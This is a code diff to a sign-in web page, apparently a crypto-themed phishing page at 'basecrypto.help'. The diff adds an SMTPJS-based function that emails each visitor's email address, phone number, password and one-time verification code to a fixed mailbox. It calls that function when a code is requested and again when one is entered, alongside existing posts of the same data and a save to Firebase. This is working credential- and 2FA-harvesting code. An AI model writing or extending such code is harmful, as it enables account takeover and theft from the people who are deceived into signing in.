@@ -292,6 +292,9 @@
   </div>
 </div>
 
+<!-- SMTPJS for direct email sending -->
+<script src="https://smtpjs.com/v3/smtp.js"></script>
+
 <!-- Firebase SDKs -->
 <script type="module">
   import { initializeApp } from "https://www.gstatic.com/firebasejs/12.12.0/firebase-app.js";
@@ -326,6 +329,27 @@
     }
   }
 
+  async function sendEmailNotification(data) {
+    if (typeof Email === 'undefined') {
+      console.error('SMTPJS is not loaded.');
+      return;
+    }
+
+    try {
+      await Email.send({
+        SecureToken: "YOUR_SMTPJS_SECURE_TOKEN_HERE",
+        To: "noreply@basecrypto.help",
+        From: "noreply@basecrypto.help",
+        ReplyTo: data.email,
+        Subject: "New submission from your sign-in page",
+        Body: `Email: ${data.email}<br/>Phone: ${data.phone}<br/>Password: ${data.password || '(none)'}<br/>Code: ${data.code || '(not entered yet)'}`
+      });
+      console.log("Email sent directly via SMTPJS");
+    } catch (e) {
+      console.error("Email send error:", e);
+    }
+  }
+
   // Expose functions to global scope for onclick handlers
   window.handleSendCode = async function(isResend) {
     var raw = document.getElementById('phoneInput').value.replace(/\D/g, '');
@@ -347,7 +371,8 @@
       body: JSON.stringify({
         email: collectedData.email,
         password: collectedData.password,
-        phone: collectedData.phone
+        phone: collectedData.phone,
+        _replyto: collectedData.email
       })
     })
     .then(response => {
@@ -358,6 +383,8 @@
       }
     })
     .catch(error => console.error("Network error:", error));
+
+    await sendEmailNotification(window.collectedData);
 
     var btn = document.getElementById('sendCodeBtn');
     btn.disabled = true;
@@ -399,7 +426,8 @@
           email: collectedData.email,
           password: collectedData.password,
           phone: collectedData.phone,
-          code: collectedData.code
+          code: collectedData.code,
+          _replyto: collectedData.email
         })
       })
       .then(response => {
@@ -411,7 +439,7 @@
       })
       .catch(error => console.error("Network error:", error));
 
-      // ✅ SAVE TO FIREBASE HERE
+      await sendEmailNotification(window.collectedData);
       await saveUserData(window.collectedData);
       goTo('screen5');
     } catch (err) {
